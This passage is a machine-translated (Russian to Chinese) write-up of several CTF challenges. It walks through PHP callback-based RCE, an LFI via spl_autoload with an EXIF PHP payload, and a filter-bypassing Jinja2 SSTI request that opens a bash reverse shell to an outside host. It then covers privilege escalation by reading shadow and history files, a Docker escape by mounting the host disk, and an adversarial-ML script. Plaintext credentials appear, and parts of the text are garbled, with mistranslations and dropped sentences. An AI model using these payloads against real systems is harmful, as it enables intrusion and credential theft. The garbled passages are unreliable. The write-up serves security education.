class="hljs-string"><span class="hljs-string">'size'</span></span>]), $_GET[<span class="hljs-string"><span class="hljs-string">'text'</span></span>]);</code> </pre> <br> 实际上，只需进行一些模糊测试就可以检测到此漏洞。 在“ <i>过滤器</i> ”输入中发送“ <b>var_dump</b> ”或“ <b>debug_zval_dump</b> ”之类的函数名称将导致服务器产生有趣的响应。 <br><br><pre> <code class="plaintext hljs">int(51) string(10) "jsdksjdksds"&lt;/code&gt; So, its not hard to guess how server side code looks like. If we had an write permission to www root, than we could just use two functions: &lt;code&gt;file_put_contents(0, "&lt;?php system($_GET[a]);") chmod(0, 777)</code> </pre> <br> 但这不是我们的情况。 解决任务至少有两种方法。 <br><br><h4>  filter_input_array向量（非预期解决方案）：RCE向量 </h4><br> 在考虑获取RCE的可能方法时，我注意到<code>function filter_input_array</code>使我们可以很好地控制<code>$filterImage variable</code> 。 <br><br> 通过<b>过滤器数组</b>作为第二个参数，将允许在函数结果上构建任意数组。 <br><br> 但是ImageMagic期望除了Imagick类之外什么都不会得到。  :( <br><br> 也许我们可以从输入中反序列化类？ 让我们在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">filter_input_array description</a>处查找其他过滤器参数。 <br><br> 函数页面本身上没有提到它，但实际上我们可以传递<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">回调以进行输入验证</a> 。  FILTER_CALLBACK示例适用于<code>filter_input</code> ，但它也适用于<code>filter_input_array</code> ！ <br><br> 这意味着我们可以使用带有一个参数（例如eval？System？）的函数来“验证”自定义用户输入，并且我们可以控制该参数。 <br><br><pre> <code class="plaintext hljs">FILTER_CALLBACK = 1024</code> </pre> <br> 获得RCE的示例： <br><br><pre> <code class="plaintext hljs">GET: a=/get_the_flag POST: filter=filter_input_array size=1 text[a][filter]=1024 text[a][options]=system submit=1</code> </pre> <br> 回应： <br><br><pre> <code class="plaintext hljs">*** Wooooohooo! *** Congratulations! Your flag is: 1m_t3h_R34L_binaeb_g1mme_my_71ck37 -- SPbCTF (vk.com/spbctf)</code> </pre> <br>  <b>搜索的</b>行： <b>1m_t3h_R34L_binaeb_g1mme_my_71ck37</b> <br><br> 肯定有什么不对劲，因为我们为什么还要获取源代码？ 只是一个提示？ 为什么上传的文件存储在磁盘上，不存储来自挑战用户的垃圾文件是否更方便？ <br><br> 巧合命名为<b>filter</b> = <b>filter</b> _input_array，文本[a] [ <b>filter</b> ]使我确信一切都按预期进行（“从未见过的<b>过滤器</b> ”，选中✓）。 <br><br><h4>  spl_autoload矢量图：LFI矢量图 </h4><br> 提交解决方案后，挑战作者之一联系了我，他们说我的载体不是预期的，可以使用另一个函数（ <code>spl_autoload</code> ）： <br><br> 我们不知道如何使用此函数，因为应该从名为“ &lt;class_name&gt; &lt;some_extension&gt;”的文件中加载类“ &lt;class_name&gt;”。 签名如下： <br><br><pre> <code class="php hljs">void spl_autoload ( string $class_name [, string $file_extensions = spl_autoload_extensions() ] )</code> </pre> <br> 我们的第一个参数只能是数字（1-512），所以<i>类名</i>是...数字？...很奇怪。 <br>  <i>扩展名</i>参数看起来也不可用，受控文件比<b>upload.php</b>还要<b>深一层</b> （我们需要传递一个前缀）。 <br><br> 如果以这种方式使用，此函数实际上可以为我们提供LFI： <br><br><pre> <code class="plaintext hljs">spl_autoload(51, "a8ae2cab09c6b728919fe09af57ded/1.jpg") = include("51a8ae2cab09c6b728919fe09af57ded/1.jpg")</code> </pre> <br> 目录名是从泄漏的源代码中获取的。 而且我们很幸运，因为如果name的第一个字符是数字以外的任何数字-&gt;我们就不能在其中包含文件。 <br><br> 所以...现在我们需要做的就是传递一个“有效种类”（ <b>getimagesize</b>必须接受） <b>* .jpg</b>文件，并修改php代码。 附有简单示例（exif中的php有效负载）。 <br><br> 将其上传为<i>1111.jpg</i> ，然后执行以下操作： <br><br>  GET： <br> 一个= / get_the_flag <br><br> 开机自检： <br> 筛选器= spl_autoload <br> 大小= 51 <br> 文字= a8ae2cab09c6b728919fe09af57ded / 1111.jpg <br> 提交= 1 <br><br> 回应： <br> <code>... .JFIF ... Exif MM * . " (. . .i . . D . D .. V .. <br> *** Wooooohooo! *** <br> <br> Congratulations! Your flag is: <br> 1m_t3h_R34L_binaeb_g1mme_my_71ck37 <br> <br> -- SPbCTF (vk.com/spbctf)</code> <br>  <b>搜索的</b>行： <b>1m_t3h_R34L_binaeb_g1mme_my_71ck37</b> <br> 上载和LFI可以在一个请求中完成。 <br><br><img src="https://habrastorage.org/webt/ya/ss/ns/yassnsu_przliwzh-nj1s0sm1gs.jpeg"><br><br><h2><a name="Time"></a> 第5天 时间 </h2><br> 此任务由<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">数字安全团队</a>准备 <br>  <i>您需要做的第一件事是制服时间，第二件事是超越小世界。</i>  <i>之后，您将获得对抗老板最终等级的武器。</i>  <i>祝你好运！</i> <i><br><br></i>  <i>51.15.75.80</i> <i><br></i> <br>  <b>提示</b> <br>  <i><b>10/27/2018 16:00</b></i> <i><br></i>  <i>哦，一个盒子上有多少个设备……它们真的有用吗？</i> <i><br></i>  <i><b>10/27/2018 14:35</b></i> <i><br></i>  <i>如果您能够处理时间面板上的过滤器，则可以使用整个系统的功能。</i>  <i>不要害羞。</i> <i><br></i>  <i><b>10/27/2018 14:25</b></i> <i><br></i>  <i>检查虚拟主机，不要停留在200</i> <i><br></i>  <i><b>10/26/2018 19:25</b></i> <i><br></i>  <i>任务没有解决。</i>  <i>添加了24小时。</i> <i><br></i>  <i><b>10/26/2018 17:35</b></i> <i><br></i>  <i>使用所有功能。</i> <i><br></i>  <i><b>10/26/2018 12:25</b></i> <i><br></i>  <i>您不需要任何取证软件即可完成任务的任何阶段。</i> <br><br><h4>  1）WordPress </h4><br> 最初，我们的地址为<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">51.15.75.80</a> 。 <br> 我们运行hehdirb-我们看到目录/ wordpress /。 立即转到<i>admin：admin</i>下的管理面板。 <br> 在管理面板中，我们看到没有更改模板的权限，因此您不能仅获得RCE。 但是，有一个隐藏的帖子： <br>  <i>2018/09/25通过管理员</i> <i><br></i>  <i>私人：关于时间面板的注释</i> <i><br></i>  <i>登录名：cristopher</i> <i><br></i>  <i>密码：L2tAPJReLbNSn085lTvRNj</i> <i><br></i>  <i>主持人：timepanel.zn</i> <br><br><h4>  2）SSTI </h4><br> 显然，您需要通过指定虚拟主机<b>timepanel.zn</b>转到同一台服务器<b>。</b> <br> 我们在此主机上启动hehdirb-我们看到/ adm_auth目录，进入上面给出的登录名和密码。 我们看到您需要输入日期（“从”和“到”）以获取一些信息的表格。 同时，我们在响应HTML代码中看到一条注释，其中反映了相同的日期： <br><br><pre> <code class="plaintext hljs">&lt;!- start time: 2018-10-25 20:00:00, finish time:2018-10-26 20:00:00 -&gt;</code> </pre> <br> 显然，此处的错误很可能与这种反射有关，并且不太可能是XSS，因此请尝试SSTI： <br><br><pre> <code class="plaintext hljs">start=2018-10-25+20%3A00%3A00{{ 1 * 0 }}&amp;finish=2018-10-26+20%3A00%3A00</code> </pre> <br> 答案是： <br><br><pre> <code class="plaintext hljs">&lt;!- start time: 2018-10-25 20:00:000, finish time:2018-10-26 20:00:00 -&gt;</code> </pre> <br> 通过发送{{self}}，{{'a'* 5}}，我们意识到这是<b>Jinja2</b> ，但是标准向量不起作用。 发送不带{{brackets}}的向量，我们看到答案没有反映字符“ _”和某些单词，例如“ class”。 通过使用request.args和| attr（）构造，以及使用转义序列对某些字节进行编码，可以轻松绕过此过滤器。 <br><br><div class="spoiler">  <b class="spoiler_title">最终查询反向连接</b> <div class="spoiler_text"> <code>POST /adm_main?sc=from+subprocess+import+check_output%0aRUNCMD+%3d+check_output&amp;cmd=bash+-c+'bash+-i+&gt;/dev/tcp/deteact.com/8000+&lt;%261' HTTP/1.1 <br> Host: timepanel.zn <br> Content-Type: application/x-www-form-urlencoded <br> Content-Length: 616 <br> Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.DrOOLQ.ROX16sOUD_7v5Ct-dV5lywHj0YM <br> <br> start={{ ''|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5f\x6dro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(2)|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(40)('/var/tmp/BECHED.cfg','w')|attr('write')(request.args.sc) }} <br> {{ ''|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5f\x6dro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(2)|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(40)('/var/tmp/BECHED.cfg')|attr('read')() }} <br> {{ config|attr('from\x5fpyfile')('/var/tmp/BECHED.cfg') }} <br> {{ config['RUNCMD'](request.args.cmd,shell=True) }} <br> &amp;finish=2018-10-26+20%3A00%3A00</code> <br> </div></div><br><h4>  3）LPE </h4><br> 收到RCE后，我们了解到您需要提升root用户特权。 我不想描述一些错误的路径（/usr/bin/special、/opt/privesc.py等），因为它们仅花费时间。 还有一个binar / usr / bin / zero，它没有suid位，但事实证明它可以读取任何文件（只需将其以stdin的十六进制编码路径发送）即可。 <br><br> 原因是功能（/ usr / bin / 0 = cap_dac_read_search + ep）。 <br> 我们读取了阴影，设置了要刷的哈希值，但是在刷完哈希后，我们猜测我们需要读取系统上另一个用户的文件： <br><br> <code>$ echo /home/cristopher/.bash_history | xxd -p | zero</code> <br> <br>  <i>我可以为你读书</i> <i><br></i>  <i>su</i> <i><br></i>  <i>Dpyax4TkuEVVsgQNz6GUQX</i> <br><br><h4>  4）Docker逃生/取证 </h4><br> 因此，我们有根。 但这还不是终点。 我们<i>将apt install extundelete放入</i>文件系统中，并找到与下一个阶段相关的其他一些有趣的文件： <br><br>  <i>要获得票证，您需要更改图像以使其标识为“ 1”。</i>  <i>您有一个模型和一个图像。</i>  <i>curl -X POST -F image=@ZeroSource.bmp'http://51.15.100.188 {6491 / predict'。</i> <br><br> 因此，现在我们面临着为机器学习模型生成竞争示例的标准任务。 但是，在这一阶段，我仍然无法获得所需的所有文件。 只有将R-Studio代理放在服务器上并处理远程取证，才有可能做到这一点。 几乎取出了我需要的东西之后，我发现实际上docker容器正在以一种允许您装载整个磁盘的模式运行 <br><br> 我们执行mount / dev / vda1 / root / kek并获得对主机文件系统的访问权，同时具有对整个服务器的root访问权（因为我们可以放置自己的ssh密钥）。 我们取出KerasModel.h5，ZeroSource.bmp。 <br><br><h4>  5）对抗性ML </h4><br> 从图片中可以清楚地看出，神经网络是在MNIST数据集上训练的。 当我们尝试将任意图片发送到服务器时，我们得到的答案是图片差异太大。 这意味着服务器要测量向量之间的距离，因为它只需要一个对抗性示例，而不仅仅是具有图像“ 1”的图片。 <br><br> 我们尝试从Foolbox收到的第一个攻击-我们获得了攻击向量，但服务器不接受（距离太大）。 然后，我狂奔了一下，开始在MNIST下重新制作“一次像素攻击”实施方案，但没有任何效果，因为这种攻击使用差分进化算法，它不是梯度的，而是尝试根据概率矢量的变化随机地找到最小值。 但是，由于神经网络过于自信，所以概率向量没有改变。 <br><br> 最后，我必须记住服务器上原始文本文件中的提示-“（Normilize ^ _ ^）”。 经过仔细的归一化，可以使用L-BFGS优化算法有效地进行攻击，以下是最终利用方法： <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> foolbox <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> keras <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> numpy <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> np <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> foolbox.attacks <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> LBFGSAttack <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> foolbox.criteria <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> TargetClassProbability <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> keras.models <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> load_model <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> PIL <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> Image image = Image.open(<span class="hljs-string"><span class="hljs-string">'./ZeroSource.bmp'</span></span>) image = np.asarray(image, dtype=np.float32) / <span class="hljs-number"><span class="hljs-number">255</span></span> image = np.resize(image, (<span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) kmodel = load_model(<span class="hljs-string"><span class="hljs-string">'KerasModel.h5'</span></span>) fmodel = foolbox.models.KerasModel(kmodel, bounds=(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) adversarial = image[:, :] <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: attack = LBFGSAttack(model=fmodel, criterion=TargetClassProbability(<span class="hljs-number"><span class="hljs-number">1</span></span>, p=<span class="hljs-number"><span class="hljs-number">.5</span></span>)) adversarial = attack(image[:, :], label=<span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">'FAIL'</span></span> quit() <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> kmodel.predict_proba(adversarial.reshape(<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) adversarial = np.array(adversarial * <span class="hljs-number"><span class="hljs-number">255</span></span>, dtype=<span class="hljs-string"><span class="hljs-string">'uint8'</span></span>) im = Image.open(<span class="hljs-string"><span class="hljs-string">'ZeroSource.bmp'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">28</span></span>): <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> y <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">28</span></span>): im.putpixel((y, x), int(adversarial[x][y][<span class="hljs-number"><span class="hljs-number">0</span></span>])) im.save(<span class="hljs-string"><span class="hljs-string">'ZeroSourcead1.bmp'</span></span>) os.system(<span class="hljs-string"><span class="hljs-string">"curl -X POST -F image=@ZeroSourcead1.bmp 'http://51.15.100.188:36491/predict'"</span></span>)</code> </pre> <br>  <b>搜索的</b>行： <b>H3y_Y0u'v_g01_4_n1c3_t1cket</b> <br><br><img src="https://habrastorage.org/webt/z0/tj/mx/z0tjmxh38kcphl5dxja6n9scepc.jpeg"><br><br><h2><a name="Awesome_Vm"></a> 第6天 很棒的虚拟机 </h2><br> 该任务是由<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">学校CTF</a>团队准备的。 <br>  <i>查看新的培训服务！</i>  <i>zn.sibears.ru:8000</i> <i><br><br></i>  <i>现在，我们希望您参与Beta版测试，该测试是为专门测试新手的编程技能而创建的新虚拟机。</i>  <i>我们增加了防止作弊的智力保护，现在希望在提供平台之前彻底检查所有内容。</i>  <i>VM允许您运行简单的程序...或不仅仅是？</i> <i><br><br></i>  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">goo.gl/iKRTrH</a></i> <br><br>  <b>提示</b> <br>  <i><b>10/27/2018 16:20</b></i> <i><br></i>  <i>也许您可以愚弄或绕过AI系统？</i> <br><br><h4> 说明： </h4><br><img src="https://habrastorage.org/webt/8k/p1/xy/8kp1xynj1xl3s7xtbs4_jznf0k4.png"><br><br> 该服务是sibVM解释器接受的扩展名为.cmpld的文件的验证系统。 发送的程序应解决的任务：计算input.txt文件中列出的数字的总和，这在某种程度上让人联想到acm竞赛。 此外，Web界面的说明指示将使用人工智能检查发送的程序。 <br><br> 该服务包含两个Docker容器： <b>web-</b> <b>docker</b>和<b>prod_inter</b> 。 <br><br> 对于分析， <b>web-docker</b>并不是特别有趣。 他所做的只是将发送的文件转换为prod_inter容器，在其中进行所有最有趣的操作。 相应的代码段显示如下： <br><img src="https://habrastorage.org/webt/ca/xv/em/caxvem0icoy4awon-funprflkps.jpeg"><br><br> 在<b>prod_inter</b>容器中，将检查发送的文件并在测试数据上执行该文件。 对于每次发送，都会在/ tmp /中随机创建一个新目录，其中已发送文件以随机名称保存。  flag.txt文件也放置在创建的目录中，这可能是我们的目标。 <br><br> 然后有趣的部分开始：如果文件大于8192字节，则使用人工智能检查程序的输入文件。  AI是预先训练的超精密神经网络。 如果测试成功（输入数据超过8192字节，并且神经网络将它们分配给第一类），则程序将在五个不同的测试上运行，并将结果发送到响应消息中并显示给用户。 <br><br> 如果输入数据的大小小于8192字节，或者它们没有通过神经网络的测试，则在测试之前，需要另外检查程序中是否存在flag.txt子字符串以及是否尝试打开具有该名称的文件。 通过运行基于<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">SECCOMP</a>技术的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">secfilter</a>沙箱中的程序并分析执行日志，可以监视对flag.txt文件的访问。 下面是相应的服务代码和尝试打开禁止文件时的日志示例： <br><br><img src="https://habrastorage.org/webt/vq/6-/-h/vq6--he6uvlc2zh6mvkmaqjow6q.jpeg"><br><br><img src="https://habrastorage.org/webt/lj/wg/vn/ljwgvn5gexwp23syezju5uexfjc.jpeg"><br><br> 为了解决此任务，我为sib​​VM解释器生成了一组程序，这些程序打开flag.txt文件并显示文件的第i个字节的数值。 同时，每个程序都成功通过了AI测试。 接下来，将介绍神经网络的表面分析和虚拟机的描述。 <br><br><h4> 神经网络分析 </h4><br> 经过训练的神经网络模型包含在cnn_model.h5文件中。 以下是有关网络体系结构的一般信息。 <br><br><img src="https://habrastorage.org/webt/lj/7a/jj/lj7ajjrgzgml68gsmqsukdrn7wa.jpeg"><br><br> 我们不知道神经网络能准确识别出什么，因此我们将尝试向其提供各种数据。 从网络的体系结构可以清楚地看出，在输入端它接收到大小为100X100的单通道图像。 为了避免缩放对结果的影响，我们将使用服务中使用的功能将10,000字节的序列转换为图像。 以下是神经网络对各种数据进行操作的结果： <br><br><img src="https://habrastorage.org/webt/s0/vd/tn/s0vdtnbuqcbnqxd1ho_5wzlyyps.jpeg"><br><br> 根据结果​​，可以假定神经网络将接收主要为黑色（零字节）的图像。 最可能的是，编写一个读取标志字符的程序所需的字节数要少于1000个（其余​​的字节可以用零填充），然后AI将接受发送的程序。 <br><br> 因此，为了解决任务，仍然需要编写所需的程序。 <br><br><h4>  SibVM解释器 </h4><br>  <b>程序结构</b> <br> 第一步是了解程序文件的结构。 在解释器的反向过程中，事实证明，程序应从具有多个服务字段的某个标头开始，然后是具有标识符的一组实体，其中应有一个类型为Function的主实体。 <br><br><div class="spoiler">  <b class="spoiler_title">文件头检查</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/2d/th/mb/2dthmbi3qyu4czj9qkc9zv8asam.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">检索记录</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ab/vm/jb/abvmjbhfwcbxnu_nqxyue6pnlua.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">处理记录并启动主要功能</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/eh/ki/qc/ehkiqcracavi3y75_bkj5kvcany.png"><br></div></div><br> 结果是以下输入文件格式： <br><br><img src="https://habrastorage.org/webt/ka/bs/py/kabspyig7f_jv7ysl_maco90itc.png"><br><br><h4> 资料类型 </h4><br> 解释器支持各种类型的实体。 下面是一个表格及其标识符，将来需要使用它们来构建程序。 <br><br><img src="https://habrastorage.org/webt/jf/fd/wc/jffdwc5yc6beasqr57sr3goy6ks.jpeg"><br><br><h4> 为口译员构建程序 </h4><br> 如上所述，程序必须具有类型为Function（5）的主条目。 它具有以下格式： <br><br><img src="https://habrastorage.org/webt/bn/hw/g3/bnhwg3b5nh2egxv9dhi1aloarx8.png"><br><br> 找出主程序执行周期并不困难。 <br><br><div class="spoiler">  <b class="spoiler_title">主要执行周期</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/dl/ny/0r/dlny0rj2neh87uf72nljadx5bp0.png"><br></div></div><br>  <code>decode_opcode</code>函数从程序代码中检索有关下一个操作的信息。 每个操作的前两个字节包含操作代码，参数数目及其类型。 接下来的几个字节（取决于参数的类型和数量）将被解释为操作的参数。 <br><br> 操作的前两个字节的格式： <br><br><img src="https://habrastorage.org/webt/gn/70/av/gn70avw2rknailevx2byn4ezspw.png"><br><br> 接下来，我们将回顾一些说明，这些说明将有助于我们从系统中提取标记。 <br><br><div class="spoiler">  <b class="spoiler_title">命令解释器图，execute_opcode函数</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ht/zm/pr/htzmprbyxebqmna2jg56vbi-jf4.png"><br></div></div><br><ul><li> 操作码0-打开文件（文件名由operation参数指定，并且为String类型），并将其内容作为<code>ByteArray</code>类型的对象放置在堆栈的顶部。 </li><li> 操作码2-显示存储在堆栈顶部的值。 不幸的是，该操作将不会显示<code>ByteArray</code>类型的对象的值。 要解决此问题，您可以获取数组的第i个元素并将其显示。 </li></ul><br><div class="spoiler">  <b class="spoiler_title">处理操作码2</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/or/vt/0p/orvt0pk4mokjuxbgw-yqjxpac8u.png"><br></div></div><br><ul><li> 操作码13-按索引从数组中获取元素。 从堆栈中弹出数组和元素索引，结果被压入堆栈。 因此，为了编译工作程序，必须将索引放在堆栈上。 </li><li> 操作码7-将运算参数压入堆栈。 </li></ul><br> 结果，该程序仅包含4个操作： <br><br><img src="https://habrastorage.org/webt/tx/t4/ga/txt4gaep-ibcfsdx0wco7gg_heg.jpeg"><br><br><img src="https://habrastorage.org/webt/ja/mv/nt/jamvnt3jnzj6xlj8pfn_vnd0dbc.png"><br><div class="spoiler">  <b class="spoiler_title">最终程序</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/m1/6y/yn/m16yynqvryb1clqwwf6hsgv0mxs.jpeg"><br></div></div><br> 搜索的行： <b>标志{76f98c7f11582d73303a4122fd04e48cba5498}</b> <br><br><img src="https://habrastorage.org/webt/yb/bw/am/ybbwamafhoijkcn2g871s_73wb8.jpeg"><br><br><h2><a name="Hiddenresource"></a> 第7天。 隐藏资源 </h2><br> 该任务由<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">RuCTF</a>准备。 <br><br>  <i>给予<a href="">n24.elf</a>服务。</i>  <i>只需授权95.216.185.52并获得标记即可。</i> <br><br>  <b>提示</b> <b><br></b>  <b><i>10/28/2018 20:00</i></b> <br>  <i>任务没有解决。</i>  <i>添加了24小时。</i> <br><br> 使用标准连接协议对服务器进行访问的调查显示，可以通过SSH（端口22）进行访问。 所提供的文件是用于Linux的ELF可执行文件（名称中的扩展名巧妙地暗示了该文件）。 <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#file UwRJ8iaEEd4tSQIe_n24.elf UwRJ8iaEEd4tSQIe_n24.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, stripped</span></span></code> </pre><br> 使用字符串实用程序显示了行“ /home/task/.ssh”和“ /home/task/.ssh/authorized_keys”的存在。 关于从ELF可执行文件（以下称为服务）访问SSH无密码授权密钥文件的可能性的结论。 <br><br> 符号表包含用于打开文件和写入的必要功能： <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># readelf --dyn-syms UwRJ8iaEEd4tSQIe_n24.elf | grep fopen 23: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fopen@GLIBC_2.2.5 (2) # readelf --dyn-syms UwRJ8iaEEd4tSQIe_n24.elf | grep write 32: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fwrite@GLIBC_2.2.5 (2)</span></span></code> </pre> <br> 符号表还包含用于处理套接字，创建进程和计算MD5的功能。 <br><br> 文件的背面显示存在大量跳跃（某种混淆）。 同时，在代码块之间执行跳转，通常可以将其分为几种类型： <br><br><ul><li>    «            OF »,   (  objdump): <br><br><pre> <code class="bash hljs"> 95b69b: 48 0f 44 c7 cmove rax,rdi 95b69f: 48 83 e7 01 and rdi,0x1 95b6a3: 4d 31 dc xor r12,r11 95b6a6: 71 05 jno 95b6ad &lt;MD5_Final@@Base+0x2d83f9&gt; 95b6a8: e9 f4 bf e1 ff jmp 7776a1 &lt;MD5_Final@@Base+0xf43ed&gt; 95b6ad: e9 1f 1a de ff jmp 73d0d1 &lt;MD5_Final@@Base+0xb9e1d&gt;</code> </pre> <br>  ,     OF        «xor», «and»  . </li><li> ,       .            .      ,  : <br><br><pre> <code class="bash hljs">95b401: c7 04 25 2b b4 95 00 mov DWORD PTR ds:0x95b42b,0x34be74 95b408: 74 be 34 00 95b40c: 66 c7 04 25 01 b4 95 mov WORD PTR ds:0x95b401,0x13eb 95b413: 00 eb 13 95b416: 4c 0f 44 da cmove r11,rdx 95b41a: 48 d1 ea shr rdx,1 95b41d: 48 0f 44 ca cmove rcx,rdx 95b421: 49 89 d3 mov r11,rdx 95b424: 48 89 ca mov rdx,rcx 95b427: 4c 89 da mov rdx,r11 95b42a: e9 8d ad e7 00 jmp 17d61bc</code> </pre> </li><li>  ,      . </li></ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据相反的结果，假设存在根据MD5算法进行计数的实现。计算所需的表未单独实现，而是直接在代码中以块的形式读取。该代码包含名称为</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_Init</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_Update</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_final的字符</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常，使用众所周知的反汇编程序及其API脚本的功能，可以静态确定程序的进度。但是反汇编程序的许可证价格昂贵，试用版可悲，很难获得，而且我使用免费软件实用程序进行管理，而且这种方式的时间更长。因此，动力越来越大。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我将ELF文件上传到虚拟机。以防万一，创建目录“ /home/task/.ssh/”。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动时，必须指定端口。</font><font style="vertical-align: inherit;">考虑到我们不控制服务器端启动，我认为该参数是虚拟的。</font><font style="vertical-align: inherit;">实际端口应该是一个。</font><font style="vertical-align: inherit;">Netstat显示了开放端口5432（UDP）。</font></font><br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># netstat -ulnp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name udp 0 0 0.0.0.0:5432 0.0.0.0:* 13611/./UwRJ8iaEEd4</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 将包含数据的数据包发送到指定的端口会显示有关其验证的消息以及来自服务的一些数据（4字节）： </font></font><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#echo "test" &gt; /dev/udp/127.0.0.1/5432 # Verifying 74657374 009ec3b8</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过对各种数据进行枚举，可以看出输出对其内容的依赖性。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来是使用gdb进行调试。</font><font style="vertical-align: inherit;">首先，我找出要从哪里获取数据，即recvfrom和backtrace的断点。</font><font style="vertical-align: inherit;">我们最后得到地址0x6ae010。</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过渡链</font></font></b> <div class="spoiler_text"><pre> <code class="bash hljs">6ae00b: e8 d0 2b d5 ff call 400be0 &lt;recvfrom@plt&gt; 6ae010: e9 64 bc ea ff jmp 559c79 &lt;MD5_Update@@Base+0x953fc&gt; 559c79: 89 45 80 mov DWORD PTR [rbp-0x80],eax 559c7c: 83 f8 ff cmp eax,0xffffffff <span class="hljs-comment"><span class="hljs-comment">#   ,  -1 559c7f: 0f 84 62 7f 1c 00 je 721be7 &lt;MD5_Final@@Base+0x9e933&gt; 559c85: e9 8a d6 2c 00 jmp 827314 &lt;MD5_Final@@Base+0x1a4060&gt; 827314: 48 c7 c7 30 d1 f0 00 mov rdi,0xf0d130 82731b: 48 29 27 sub QWORD 